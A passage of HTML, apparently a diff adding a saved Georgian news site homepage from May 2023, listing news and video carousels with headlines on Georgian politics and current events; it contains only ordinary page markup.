+                    <a href="inside.php?menuid=3&amp;id=208556" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">23 მაისის 20:00 საათიდან 23:00 საათამდე თავისუფლების მოედანზე ტრანსპორტის მოძრაობა დროებით შეიზღუდება </a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  15:29</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=101&amp;id=208555"><img src="uploads/news_208555.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=101&amp;id=208555" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">ლევან ნიკოლეიშვილი ინგა გრიგოლიას: რადიკალების პროპაგანდისტო, ის არ იცი, რომ რუსეთ-უკრაინის ომის მიმდინარეობისას, ამ წუთებშიც - უკრაინა უდიდესი მოცულობის რუსულ გაზს ატარებს თავის ტერიტორიაზე და შემდეგ ევროპას აწვდის?</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  15:20</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=3&amp;id=208554"><img src="uploads/news_208554.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=3&amp;id=208554" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">პრემიერ-მინისტრი ირაკლი ღარიბაშვილი კატარის პრემიერ-მინისტრს შეხვდა</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  15:15</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=4&amp;id=208553"><img src="uploads/news_208553.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=4&amp;id=208553" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">პოლიციამ განზრახ მკვლელობის ფაქტი ცხელ კვალზე გახსნა - დაკავებულია ერთი პირი</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  14:59</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=2&amp;id=208552"><img src="uploads/news_208552.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=2&amp;id=208552" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">არჩილ თალაკვაძე თაკო ჩარკვიანის დაანონსებულ აქციაზე: სერიოზული კომენტარის გაკეთება გამიჭირდება. რა აქციების ჩამტარებლები არიან, ბევრჯერ ვნახეთ</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  14:55</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=2&amp;id=208551"><img src="uploads/news_208551.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=2&amp;id=208551" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">რატი იონათამიშვილი „ყვარლის ტბასთან“ გამართულ აქციაზე: გამოდის, ხოშტარიამ წინასწარ იცოდა, რომ სასტუმროში არავინ იყო და საკუთარი მცირერიცხოვანი აქტივისტები მოატყუა</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  14:43</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=2&amp;id=208550"><img src="uploads/news_208550.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=2&amp;id=208550" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">არჩილ თალაკვაძე: „ნაციონალური მოძრაობა“ არის პოლიტიკურ თავდაღმართში</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  14:34</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              
+    
+              </ul>
+    
+              <div>
+    
+              <ul class="carousel_pages">
+    
+                <li class="prev" style="margin-left: 5px; display: inline-block;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=8&amp;h=11" width="8" height="11" alt="prv">
+    </a></li>
+    
+                <ul class="pages" data-jcarouselpagination="true"><li class="" style="display: inline-block;"><a href="#1">1</a></li><li class="active_page" style="display: inline-block;"><a href="#2">2</a></li><li style="display: inline-block;"><a href="#3">3</a></li><li style="display: inline-block;"><a href="#4">4</a></li><li style="display: inline-block;"><a href="#5">5</a></li><li style="display: inline-block;"><a href="#6">6</a></li><li style="display: inline-block;"><a href="#7">7</a></li><li style="display: inline-block;"><a href="#8">8</a></li><li style="display: inline-block;"><a href="#9">9</a></li></ul>
+    
+            
+    
+                <li class="next" style="margin-right: 4px; display: inline-block;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_nxt.png?w=8&amp;h=11" width="8" height="11" alt="sld_nxt">
+    </a></li>
+    
+              </ul>
+    
+              </div>
+    
+            </div>
+    
+            <!--end home slider--> 
+    
+            
+    
+    
+            <ul class="vip_news_block right_column">
+    
+              <li class="cat_mark_top" style="margin-left:10px;padding-bottom: 1px;padding-left: 6px;">TOP - ვიდეო</li>
+    
+                
+    
+                
+                <li style="margin-top:-10px; background-color:#dadada;">
+    
+                        
+                <a style="cursor:pointer;" onclick="video('a6tqMEHDED8');"><img src="uploads/news_208318.jpg?w=164&amp;h=110" width="164" height="110" alt="newssampl">
+    </a>
+    
+                <a style="color:inherit;margin-bottom:0;margin-top:-1px;height: 56px;cursor:pointer;" onclick="video('a6tqMEHDED8');">თბილისში დევნილი ოჯახებისთვის ბინების მშენებლობა დაიწყო - პრემიერის კომენტარი...</a>
+    
+    
+                  <!---->
+                              <!---->
+    
+                </li>
+    
+                
+              
+    
+                
+                <li style="background-color:#D9D9D9;">
+    
+                 
+                <a style="cursor:pointer;" onclick="video('bCXKnRUMoJ4');"><img src="uploads/news_208319.jpg?w=164&amp;h=110" width="164" height="110" alt="newssampl">
+    </a>
+    
+                 <a style="color:inherit;margin-bottom:-1px;margin-top:-1px;height: 56px;cursor:pointer;" onclick="video('bCXKnRUMoJ4');">საპარლამენტო უმრავლესობის წევრი, გია ცაგარეიშვილი გადაცემაში „იმედი LIVE“...</a>
+    
+                 <!---->
+                              <!---->
+                </li>
+    
+                
+    
+    
+            </ul>
+    
+            <ul class="vip_news_block" style="margin-top:0px">
+    
+              <span class="category_mark left_sider" style="top:-16px;right: 100.5%;">დღის თემა</span>
+    
+    
+    
+              
+    
+              
+              <li>
+              
+                <a href="inside.php?menuid=2&amp;id=208546">
+    
+                <img src="uploads/news_208546.jpg?w=164&amp;h=110" width="164" height="110" alt="newssampl">
+    
+    
+                </a>
+                <a style="color:inherit;height:56px;margin-bottom: 0px;" href="inside.php?menuid=2&amp;id=208546">ირაკლი ღარიბაშვილი: კატარის სახელმწიფოს ემირთან შეხვედრაზე განვიხილეთ ჩვენს ქვეყნებს შორის...</a>
+    
+                <!---->
+                              <!---->
+    
+              </li>
+    
+            
+    
+    
+            
+              <li>
+                               <a href="inside.php?menuid=2&amp;id=208550">
+    
+                <img src="uploads/news_208550.jpg?w=164&amp;h=110" width="164" height="110" alt="newssamp2">
+    
+    
+                </a>
+    
+                <a style="color:inherit;height:56px;margin-bottom: 0px;" href="inside.php?menuid=2&amp;id=208550">არჩილ თალაკვაძე: „ნაციონალური მოძრაობა“ არის პოლიტიკურ თავდაღმართში...</a>
+    
+                <!---->
+                              <!---->
+    
+              </li>
+    
+              
+    
+    
+    
+            
+              <li>
+                               <a href="inside.php?menuid=2&amp;id=208545">
+    
+                <img src="uploads/news_208545.jpg?w=164&amp;h=110" width="164" height="110" alt="newssamp2">
+    
+    
+                </a>
+    
+                 <a style="color:inherit;height:56px;margin-bottom: 0px;" href="inside.php?menuid=2&amp;id=208545">ირაკლი კობახიძე საქართველოში იაპონიის ელჩს, იმამურა აკირას შეხვდა...</a>
+    
+                 <!---->
+                              <!---->
+              </li>
+    
+              
+    
+    
+    
+            
+               <li>
+                               <a href="inside.php?menuid=3&amp;id=208554">
+    
+                <img src="uploads/news_208554.jpg?w=164&amp;h=110" width="164" height="110" alt="newssamp2">
+    
+    
+                </a>
+    
+                <a style="color:inherit;height:56px;margin-bottom: 0px;" href="inside.php?menuid=3&amp;id=208554">პრემიერ-მინისტრი ირაკლი ღარიბაშვილი კატარის პრემიერ-მინისტრს შეხვდა...</a>
+    
+                <!---->
+                              <!---->
+    
+               </li>
+    
+               
+    
+    
+    
+    
+    
+    
+    
+            </ul>
+    
+          </div>
+    
+          
+          <ul class="small_banners">
+    
+            <li><a href="" target="_blank"><img src="uploads/banner_157.jpg?w=353&amp;h=91" width="353" height="91" alt="small_banner">
+    </a></li>
+            <li><a href="http://qartuliazri.reportiori.ge/index.php" target="_blank"><img src="uploads/banner_158.jpg?w=353&amp;h=91" width="353" height="91" alt="small_banner">
+    </a></li>
+    
+          </ul>
+    
+    <div class="four_news_wrap" style="margin-top:21px;  width: 702px;"> <a href="index.php?menuid=68"><span class="category_mark left_sider" style="transform:none;right:76%;top:-22px;">TV - პრეს - დაიჯესტი</span></a>
+    
+      <div class="jcarousel" style="margin-bottom:0px;" data-jcarousel="true">
+    
+          <ul class="news_block" style="height: 200px; left: 0px; top: 0px;">
+    
+               
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208263" style="cursor:pointer;"><img src="uploads/news_208263.jpeg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208263" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              გია ცაგარეიშვილი: რატომ დადიან ეს სამადაშვილები და სხვები და თავს ლაფს რატომ ასხამენ ...</a>
+              <span class="big_news_date" style="font-size:12px">19 მაისი. 2023.  00:01</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208261" style="cursor:pointer;"><img src="uploads/news_208261.jpeg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208261" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              გია ცაგარეიშვილი: ყველაფერს გავაკეთებთ იმისთვის, რომ საქართველოში სუფევდეს სამოქალაქო...</a>
+              <span class="big_news_date" style="font-size:12px">18 მაისი. 2023.  23:41</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208260" style="cursor:pointer;"><img src="uploads/news_208260.jpeg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208260" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              გია ცაგარეიშვილი: დღეს ბეჟაშვილისგან გავიგეთ, რომ თურმე სააკაშვილის პრემიერ-მინისტრობ...</a>
+              <span class="big_news_date" style="font-size:12px">18 მაისი. 2023.  23:39</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208259" style="cursor:pointer;"><img src="uploads/news_208259.jpeg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208259" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              გია ცაგარეიშვილი: მას შემდეგ, რაც ევროკომისიამ წარმოგვიდგინა 12 პუნქტი, „ნაცმოძრაობის...</a>
+              <span class="big_news_date" style="font-size:12px">18 მაისი. 2023.  23:37</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208145" style="cursor:pointer;"><img src="uploads/news_208145.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208145" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ირაკლი კობახიძე: მთავარი მიზეზი, რატომაც ვთქვით უარი პირველადი ვერსიის ხელმოწერაზე, ი...</a>
+              <span class="big_news_date" style="font-size:12px">17 მაისი. 2023.  11:48</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208142" style="cursor:pointer;"><img src="uploads/news_208142.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208142" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ირაკლი კობახიძე: ამერიკული საკონსულოს სტატისტიკით, საქართველოს მოქალაქეებს დაუკმაყოფი...</a>
+              <span class="big_news_date" style="font-size:12px">17 მაისი. 2023.  11:11</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208138" style="cursor:pointer;"><img src="uploads/news_208138.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208138" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ირაკლი კობახიძე: ჩვენ ვაწარმოებთ პრაგმატულ პოლიტიკას, რომლის მთავარი მიზანია, არ დაზა...</a>
+              <span class="big_news_date" style="font-size:12px">17 მაისი. 2023.  10:43</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208135" style="cursor:pointer;"><img src="uploads/news_208135.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208135" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ირაკლი კობახიძე: ჩვენ გვაქვს კონსტიტუციური ვალდებულება, სახელმწიფომ ხელი უნდა შეუწყოს...</a>
+              <span class="big_news_date" style="font-size:12px">17 მაისი. 2023.  10:26</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208132" style="cursor:pointer;"><img src="uploads/news_208132.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208132" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ირაკლი კობახიძე: რუსეთისთვის სანქციების დაწესება ნიშნავს საკუთარი ქვეყნის და ხალხის დ...</a>
+              <span class="big_news_date" style="font-size:12px">17 მაისი. 2023.  10:06</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=68&amp;id=208115" style="cursor:pointer;"><img src="uploads/news_208115.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=68&amp;id=208115" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ირაკლი კობახიძე: დღეს სოროსის ფონდში გაიმართა უცხოელი აგენტების თავყრილობა, გამოაქვეყ...</a>
+              <span class="big_news_date" style="font-size:12px">16 მაისი. 2023.  22:54</span>
+              
+            </li>
+    
+               
+    
+       
+    
+          </ul>
+    
+          <ul class="carousel_pages">
+    
+                <li class="prev" style="margin-left:-5px;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+          <a class="archive" href="index.php?menuid=68">არქივი</a> 
+          </div>
+    
+        </div>
+    
+    
+    <a class="right_banner" href="/adv.php?AID=162" target="_blank"><img src="uploads/banner_165.png?w=712&amp;h=114" width="712" height="114" alt="right_banner">
+    </a>
+    
+    
+    
+        <div class="four_news_wrap" style="margin-top:29px;  width: 702px;"> <a href="index.php?menuid=66"><span class="category_mark left_sider" style="transform:none;right:86%;top:-22px;">TV - ვიდეო</span></a>
+    
+      <div class="jcarousel" style="margin-bottom:0px;" data-jcarousel="true">
+    
+          <ul class="news_block" style="height: 200px; left: 0px; top: 0px;">
+    
+               
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_208529.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              გამოსვლა პარლამენტის პლენარულ სხდომაზე, მინისტრის საათის ფარგლებში...</a>
+              <span class="big_news_date" style="font-size:12px">23 მაისი. 2023.  10:45</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('bCXKnRUMoJ4');"><img src="uploads/news_208319.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('bCXKnRUMoJ4');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              საპარლამენტო უმრავლესობის წევრი, გია ცაგარეიშვილი გადაცემაში „იმედი LIVE“...</a>
+              <span class="big_news_date" style="font-size:12px">19 მაისი. 2023.  16:40</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('a6tqMEHDED8');"><img src="uploads/news_208318.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('a6tqMEHDED8');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              თბილისში დევნილი ოჯახებისთვის ბინების მშენებლობა დაიწყო - პრემიერის კომენტარი...</a>
+              <span class="big_news_date" style="font-size:12px">19 მაისი. 2023.  16:24</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('skkJNaJj1wM&amp;list=PLue6znsWBAfeyEGMDP5AwLCcQYIZFlMpI&amp;index=2');"><img src="uploads/news_208133.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('skkJNaJj1wM&amp;list=PLue6znsWBAfeyEGMDP5AwLCcQYIZFlMpI&amp;index=2');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              ირაკლი კობახიძე გადაცემაში „თავისუფალი ხედვა“...</a>
+              <span class="big_news_date" style="font-size:12px">17 მაისი. 2023.  10:12</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('3-p0v9vBIQk');"><img src="uploads/news_207925.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('3-p0v9vBIQk');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              პრემიერ მინისტრის კომენტარი...</a>
+              <span class="big_news_date" style="font-size:12px">12 მაისი. 2023.  19:40</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('53S6qL502Mk');"><img src="uploads/news_207924.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('53S6qL502Mk');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              იუსტიციის მინისტრის ბრიფინგი...</a>
+              <span class="big_news_date" style="font-size:12px">12 მაისი. 2023.  19:20</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('qKFuCrfTbOw');"><img src="uploads/news_207573.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('qKFuCrfTbOw');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              თბილისში „ევროპის დღის“ აღსანიშნავი ღონისძიება მიმდინარეობს...</a>
+              <span class="big_news_date" style="font-size:12px">6 მაისი. 2023.  16:15</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('yi6ESHiN8HI');"><img src="uploads/news_207509.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('yi6ESHiN8HI');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              „სააკაშვილი“ - I სერია („ობიექტივის“ გამომძიებელ ჟურნალისტთა დოკუმენტური ფილმი)...</a>
+              <span class="big_news_date" style="font-size:12px">5 მაისი. 2023.  10:10</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('h6TRzOmHgFE');"><img src="uploads/news_207508.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('h6TRzOmHgFE');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              კახა კალაძე გადაცემაში „იმედი LIVE“...</a>
+              <span class="big_news_date" style="font-size:12px">5 მაისი. 2023.  09:09</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4.5px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" onclick="video('K_xe_RcUZoQ');"><img src="uploads/news_207470.jpg?w=172&amp;h=114" width="172" height="114" alt="newssampl">
+    </a></div>
+    
+              <a onclick="video('K_xe_RcUZoQ');" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              საპარლამენტო დელეგაციის ვიზიტი იაპონიაში...</a>
+              <span class="big_news_date" style="font-size:12px">4 მაისი. 2023.  15:15</span>
+              
+            </li>
+    
+               
+    
+       
+    
+          </ul>
+    
+          <ul class="carousel_pages">
+    
+                <li class="prev" style="margin-left:-5px;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+          <a class="archive" href="index.php?menuid=66">არქივი</a> 
+          </div>
+    
+        </div>
+    <a class="right_banner" href=""><img src="uploads/banner_165.png?w=712&amp;h=114" width="712" height="114" alt="right_banner">
+    </a>
+    
+      <div class="highlite_news_wrap" style="margin-top:8px"> 
+    
+          <!-- <img class="typemachine" src="images/sabechdi.png" style="position:absolute; z-index:99; right:100%; top:30%; display:inline-block; margin-right:10px;" /> -->
+    
+      
+          
+    
+    
+    
+                  
+    
+            <div class="news_block_wrap" style="width:352px;float: left;margin-top: 21px;"> <a href="index.php?menuid=75"><span class="category_mark left_sider" style="transform:none;right:55.5%;top:-22px;">TV - რეპორტიორი</span></a>
+    
+            <div class="jcarousel" style="width:352px;" data-jcarousel="true">
+    
+              <ul class="news_block" style="left: 0px; top: 0px;">
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-155515">
+                    
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('ajsjfSphVZk');"><img src="uploads/news_155515.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('ajsjfSphVZk');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-155515">გიორგი მამაცაშვილის ექსკლუზიური ინტერვიუ თენგიზ კიტოვანთან. 2015...</span>
+                  <!--<span id="big_title-155515" class="hover">გიორგი მამაცაშვილის ექსკლუზიური ინტერვიუ თენგიზ კიტოვანთან. 2015...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  17:55</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-155499">
+                    
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('RTp5kG2NHXM');"><img src="uploads/news_155499.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('RTp5kG2NHXM');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-155499">კახი კავსაძე ზეციურ თეატრს შეუერთდა!...</span>
+                  <!--<span id="big_title-155499" class="hover">კახი კავსაძე ზეციურ თეატრს შეუერთდა!...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  17:44</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-155248">
+                    
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('d42h2UnU1YI');"><img src="uploads/news_155248.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('d42h2UnU1YI');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-155248">ეროვნული სასახლე - 80...</span>
+                  <!--<span id="big_title-155248" class="hover">ეროვნული სასახლე - 80...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  17:31</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-154504">
+                    
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('MPMnyWsB85g');"><img src="uploads/news_154504.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('MPMnyWsB85g');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-154504">რეპორტაჟი მაია კახიძის წიგნების პრეზენტაციიდან...</span>
+                  <!--<span id="big_title-154504" class="hover">რეპორტაჟი მაია კახიძის წიგნების პრეზენტაციიდან...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  19:33</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-153188">
+                    
